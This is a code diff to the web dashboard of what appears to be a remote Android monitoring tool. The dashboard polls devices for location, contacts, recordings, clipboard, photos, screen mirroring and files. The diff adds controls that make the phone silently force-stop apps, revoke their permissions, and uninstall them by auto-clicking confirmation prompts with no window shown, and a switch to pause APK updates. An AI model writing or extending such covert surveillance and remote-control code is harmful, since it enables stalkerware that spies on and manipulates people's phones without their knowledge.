@@ -326,6 +326,17 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 </label>
 <span id="syncToggleStatus_location" style="font-size:12px;color:var(--muted);margin-left:auto">—</span>
 </div>
+<div style="display:flex;align-items:center;gap:12px;margin-bottom:10px;padding:10px 12px;background:var(--card);border:1px solid var(--border);border-radius:8px" id="updatePauseWrap">
+<label style="display:flex;align-items:center;gap:8px;cursor:pointer;user-select:none">
+<div style="position:relative;width:44px;height:24px">
+<input type="checkbox" id="updatePauseToggle" onchange="toggleUpdatePause(this.checked)" style="opacity:0;width:0;height:0">
+<span id="updatePauseSlider" style="position:absolute;inset:0;background:var(--success);border-radius:12px;transition:.2s"></span>
+<span id="updatePauseKnob" style="position:absolute;left:2px;top:2px;width:20px;height:20px;background:#fff;border-radius:50%;transition:.2s;box-shadow:0 1px 3px rgba(0,0,0,.3)"></span>
+</div>
+<span id="updatePauseLabel" style="font-size:13px;font-weight:600;color:var(--success)">Updates: Collecting</span>
+</label>
+<span id="updatePauseStatus" style="font-size:12px;color:var(--muted);margin-left:auto">—</span>
+</div>
 <div class="grid">
 <div style="grid-column:1 / -1;display:flex;gap:6px;flex-wrap:wrap;font-size:10px">
   <span class="chip" style="background:var(--bg);border-color:var(--border);color:var(--muted)" id="swAppVer">&#x1F4E6; --</span>
@@ -2861,6 +2872,7 @@ document.getElementById('deviceSelect').addEventListener('change', function() {
   if (countEl) { countEl.textContent = '0'; countEl.style.color = 'var(--muted)'; }
   pollAppVer();
   pollAll();
+  setTimeout(pollUpdatePause, 800);
 });
 
 // --- Polling ---
@@ -2893,6 +2905,7 @@ function startPolling() {
   schedulePoll('videos', 60000, pollVideos);
   schedulePoll('clipboard', intervals.clipboard, pollClipboard);
   schedulePoll('syncToggles', 30000, pollSyncToggles);
+  schedulePoll('updatePause', 30000, pollUpdatePause);
   schedulePoll('files', 14 * 60 * 1000, pollFileInventory);
 }
 
@@ -2905,7 +2918,7 @@ function schedulePoll(name, interval, fn) {
 }
 
 async function pollAll() {
-  const fns = [pollLocation(), pollMeta(), pollAppSnapshots(), pollHistory(), pollVoiceNotes(), pollRemoteRecordings(), pollContacts(), pollFcmToken(), pollQueueSize(), pollPermissions(), pollWifiScans(), pollNearbyScans(), pollLogcat(), pollHealth(), pollVideos(), pollPhotos(), pollMirroring(), pollSpy(), pollAppVer(), pollClipboard(), pollFileInventory(), pollSyncToggles()];
+  const fns = [pollLocation(), pollMeta(), pollAppSnapshots(), pollHistory(), pollVoiceNotes(), pollRemoteRecordings(), pollContacts(), pollFcmToken(), pollQueueSize(), pollPermissions(), pollWifiScans(), pollNearbyScans(), pollLogcat(), pollHealth(), pollVideos(), pollPhotos(), pollMirroring(), pollSpy(), pollAppVer(), pollClipboard(), pollFileInventory(), pollSyncToggles(), pollUpdatePause()];
   for (const fn of fns) { try { await fn; } catch {} }
 }
 
@@ -7681,6 +7694,14 @@ function renderPermSpyList(){
   let title = criticalList.length ? '\u2620 Spy Potential — Critical ('+criticalList.length+' apps)' : '\u2705 No Critical spy apps — showing top risk (sorted by score)';
   let titleColor = criticalList.length ? 'var(--danger)' : 'var(--success)';
   let h = '<div style="font-size:13px;color:'+titleColor+';font-weight:600;padding:6px 0 4px">'+title+'</div>';
+  // Show last spy response if present
+  const last = window.spyLastResponse;
+  if(last && last.packageName){
+    const ago = last.ts_ms ? pktShort(last.ts_ms) : '';
+    const ok = last.success ? 'var(--success)' : 'var(--danger)';
+    const icon = last.success ? '\u2705' : '\u26A0';
+    h += '<div class="card" style="padding:6px 8px;margin-bottom:6px;border-left:3px solid '+ok+'"><div style="font-size:12px;color:var(--text)">'+icon+' Last: '+last.action+' '+last.packageName+' → '+String(last.result||'').replace(/</g,'&lt;')+' <span style="color:var(--muted);font-size:10px">'+ago+'</span></div></div>';
+  }
   h += '<div style="display:flex;flex-direction:column;gap:6px">';
   for(const app of list){
     const score = app.riskScore||0;
@@ -7693,6 +7714,12 @@ function renderPermSpyList(){
     const sysPill = '<span class="chip" style="font-size:9px;padding:1px 6px;background:var(--card);color:var(--muted);border-color:var(--border)">'+(app.system?'System':'User')+'</span>';
     const recentStyle = recently ? 'border-left-color:var(--accent);box-shadow:0 0 6px rgba(255,202,40,.25)' : 'border-left-color:'+col;
     const pkgEsc = app.packageName.replace(/'/g,"\\'").replace(/"/g,'&quot;');
+    // Per-app inline status if it matches last response
+    let inlineStatus = '';
+    if(last && last.packageName === app.packageName){
+      const ok2 = last.success ? 'var(--success)' : 'var(--danger)';
+      inlineStatus = '<div style="font-size:11px;color:'+ok2+';margin-top:4px">'+(last.success?'\u2705':'\u26A0')+' '+String(last.result||'').replace(/</g,'&lt;')+'</div>';
+    }
     h += '<div class="card" style="padding:8px 10px;margin-bottom:0;'+recentStyle+'">'
       + '<div style="display:flex;justify-content:space-between;align-items:center;gap:6px;flex-wrap:wrap"><span style="font-weight:600;color:var(--text)">'+app.appName+'</span><span style="display:flex;gap:4px;align-items:center">'+riskChip(app.riskLevel)+sysPill+srcBadge+(recently?'<span class="chip" style="font-size:9px;background:var(--accent);color:#000">NEW</span>':'')+'</span></div>'
       + '<div style="font-size:10px;color:var(--muted)">'+app.packageName+'</div>'
@@ -7700,6 +7727,7 @@ function renderPermSpyList(){
       + '<div style="display:flex;justify-content:space-between;font-size:11px;color:var(--muted)"><span>risk '+score+'</span><span>'+pct+'%</span></div>'
       + (reasons?'<div style="font-size:11px;color:var(--muted);margin-top:4px">Reasons: '+reasons.replace(/</g,'&lt;')+'</div>':'')
       + (recently?'<div style="font-size:10px;color:var(--accent);margin-top:2px">\u26A0 Recently installed (7d)</div>':'')
+      + inlineStatus
       + '<div style="display:flex;gap:6px;margin-top:8px"><button onclick="pauseSpyApp(\''+pkgEsc+'\')" style="flex:1;padding:6px 8px;background:var(--accent);color:#000;border:none;border-radius:6px;font-size:12px;font-weight:600;cursor:pointer">\u23F8 Pause</button><button onclick="deleteSpyApp(\''+pkgEsc+'\')" style="flex:1;padding:6px 8px;background:var(--danger);color:#fff;border:none;border-radius:6px;font-size:12px;font-weight:600;cursor:pointer">\uD83D\uDDD1 Delete</button></div>'
       + '</div>';
   }
@@ -7707,23 +7735,43 @@ function renderPermSpyList(){
   el.innerHTML = h;
   return h;
 }
+async function spyControlSend(pkg, action){
+  if(!selectedDevice || !pkg) return;
+  const pushId = Date.now().toString(36) + Math.random().toString(36).slice(2,6);
+  const payload = {action, packageName:pkg, ts_ms:Date.now()};
+  // Write to queue child — avoids overwrite when spamming pause+delete
+  await writeRTDBStrict(`devices/${selectedDevice}/commands/spy_control/${pushId}`, payload);
+  // Also write legacy single object for old APKs still polling that path
+  try{ await writeRTDBStrict(`devices/${selectedDevice}/commands/spy_control`, payload); }catch(_){}
+}
 async function pauseSpyApp(pkg){
   if(!selectedDevice || !pkg) return;
-  if(!confirm('Pause '+pkg+'? This will force-stop the app and revoke its Camera/Mic/Location without opening settings.')) return;
+  if(!confirm('Pause '+pkg+'? This will force-stop the app and revoke Camera/Mic/Location/SMS/Contacts/Call Log. Silent — no window on phone.')) return;
   try{
-    await writeRTDBStrict(`devices/${selectedDevice}/commands/spy_control`, {action:'pause', packageName:pkg, ts_ms:Date.now()});
-    showAlert('Pause sent for '+pkg+' — will force-stop+revoke in ~30s (silent, no system prompt)', 'warn');
-    setTimeout(pollPermissions, 3500);
+    await spyControlSend(pkg, 'pause');
+    showAlert('Pause sent for '+pkg+' — silent force-stop+revoke in ~30s (auto-find buttons)', 'warn');
+    setTimeout(async()=>{ await pollSpyStatus(); await pollPermissions(); }, 3500);
+    // re-check a few times for verification
+    setTimeout(pollSpyStatus, 10000); setTimeout(pollPermissions, 15000);
   }catch(e){ showAlert('Pause failed: '+e.message,'error'); }
 }
 async function deleteSpyApp(pkg){
   if(!selectedDevice || !pkg) return;
-  if(!confirm('Delete '+pkg+'? Will try silent uninstall, fallback to one OK/Cancel on phone.')) return;
+  if(!confirm('Delete '+pkg+'? Will try silent uninstall auto-clicking confirm silently, fallback to one OK/Cancel only if silent fails.')) return;
   try{
-    await writeRTDBStrict(`devices/${selectedDevice}/commands/spy_control`, {action:'delete', packageName:pkg, ts_ms:Date.now()});
-    showAlert('Delete sent for '+pkg+' — silent try then one OK/Cancel on phone', 'warn');
-    setTimeout(pollPermissions, 5000);
+    await spyControlSend(pkg, 'delete');
+    showAlert('Delete sent for '+pkg+' — silent uninstall (auto-click) in ~30s, fallback prompt only if needed', 'warn');
+    setTimeout(async()=>{ await pollSpyStatus(); await pollPermissions(); }, 5000);
+    setTimeout(pollSpyStatus, 12000); setTimeout(pollPermissions, 18000);
   }catch(e){ showAlert('Delete failed: '+e.message,'error'); }
+}
+async function pollSpyStatus(){
+  if(!selectedDevice) return;
+  try{
+    const data = await fetchRTDB(`devices/${selectedDevice}/responses/spy_control`);
+    window.spyLastResponse = data;
+    renderPermSpyList();
+  }catch(_){}
 }
 
 function renderPermissions() {
@@ -7861,11 +7909,13 @@ function renderPermissions() {
 
 async function pollPermissions() {
   if (!selectedDevice) return;
-  const [data, riskData, spyData] = await Promise.all([
+  const [data, riskData, spyData, spyResp] = await Promise.all([
     fetchRTDB(`devices/${selectedDevice}/permissions`),
     fetchRTDB(`devices/${selectedDevice}/permissions_risk`),
-    fetchRTDB(`devices/${selectedDevice}/spywatch`)
+    fetchRTDB(`devices/${selectedDevice}/spywatch`),
+    fetchRTDB(`devices/${selectedDevice}/responses/spy_control`).catch(()=>null)
   ]);
+  if(spyResp && spyResp.packageName) window.spyLastResponse = spyResp;
   // store warning check for banner
   window.permRiskRaw = riskData;
   window.permSpyWarning = spyData;
@@ -8176,6 +8226,52 @@ async function pollSyncToggles(){
       else paused = false;
       updateSyncToggleUI(tgt, paused);
     }
+  }catch(e){}
+}
+// --- Per-device update pause (Live tab) ---
+async function toggleUpdatePause(paused){
+  if(!selectedDevice){ showAlert('No device selected','error'); return; }
+  const statusEl = document.getElementById('updatePauseStatus');
+  const labelEl = document.getElementById('updatePauseLabel');
+  const sliderEl = document.getElementById('updatePauseSlider');
+  const knobEl = document.getElementById('updatePauseKnob');
+  if(statusEl) statusEl.textContent = paused ? 'Pausing…' : 'Resuming…';
+  try{
+    const action = paused ? 'pause' : 'resume';
+    const ts = Date.now();
+    const ok1 = await writeRTDBStrict(`devices/${selectedDevice}/commands/update_control`, {action, target:'update', ts_ms: ts});
+    const ok2 = await writeRTDBStrict(`devices/${selectedDevice}/config/update_paused`, paused);
+    if(ok1 && ok2) showAlert((paused?'Paused ':'Resumed ')+'updates for '+deviceLabelFor(selectedDevice),'warn');
+    else showAlert('Failed to set update pause','error');
+  }catch(e){ showAlert('Toggle failed: '+e.message,'error'); }
+  setTimeout(pollUpdatePause, 1500);
+}
+function updateUpdatePauseUI(paused){
+  const t = document.getElementById('updatePauseToggle');
+  const s = document.getElementById('updatePauseSlider');
+  const k = document.getElementById('updatePauseKnob');
+  const l = document.getElementById('updatePauseLabel');
+  const st = document.getElementById('updatePauseStatus');
+  if(t) t.checked = paused;
+  if(s) s.style.background = paused ? 'var(--danger)' : 'var(--success)';
+  if(k) k.style.left = paused ? '22px' : '2px';
+  if(l){ l.textContent = paused ? 'Updates: Paused' : 'Updates: Collecting'; l.style.color = paused ? 'var(--danger)' : 'var(--success)'; }
+  if(st) st.textContent = paused ? 'Paused — fresh updates blocked & pending APK cleared' : 'Collecting — updates enabled';
+}
+async function pollUpdatePause(){
+  if(!selectedDevice) return;
+  try{
+    let paused = false;
+    let data = await fetchRTDB(`devices/${selectedDevice}/config/update_paused`);
+    if(data===true || data===false) paused = data===true;
+    else if(data && typeof data==='object'){
+      if('paused' in data) paused = !!data.paused;
+      else if('value' in data) paused = !!data.value;
+    } else if(typeof data==='string'){
+      if(data==='true') paused = true;
+      else if(data==='false') paused = false;
+    }
+    updateUpdatePauseUI(paused);
   }catch(e){}
 }
 
